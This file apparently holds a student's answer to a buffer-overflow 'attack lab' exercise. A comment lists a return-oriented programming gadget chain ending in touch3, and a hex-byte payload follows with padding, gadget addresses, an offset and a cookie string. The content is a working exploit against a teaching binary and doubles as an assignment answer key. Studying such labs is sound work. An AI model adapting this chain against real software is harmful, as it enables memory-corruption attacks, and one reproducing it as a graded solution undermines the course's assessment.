 /*
	movl %rsp, %rax 401aad setval_350
					4019c5
	popq %rax       4019ab addval_219
	movl %eax, %edx 4019dd getval_481
	movl %edx, %ecx 401a34 getval_159
	movl %ecx, %esi 401a13 addval_436
						   add_xy
	movq %rax, %rdi 4019c5 setval_426
	4018fa <touch3>

	0xc0 bytes
 */

 30 30 30 30 30 30 30 30
 30 30 30 30 30 30 30 30
 30 30 30 30 30 30 30 30
 30 30 30 30 30 30 30 30
 35 39 62 39 39 37 66 61
 ad 1a 40 00 00 00 00 00
 c5 19 40 00 00 00 00 00
 ab 19 40 00 00 00 00 00
 c0 00 00 00 00 00 00 00
 dd 19 40 00 00 00 00 00
 34 1a 40 00 00 00 00 00
 13 1a 40 00 00 00 00 00
 d6 19 40 00 00 00 00 00
 c5 19 40 00 00 00 00 00
 fa 18 40 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00
 35 39 62 39 39 37 66 61
 00 00 00 00 00 00 00 00
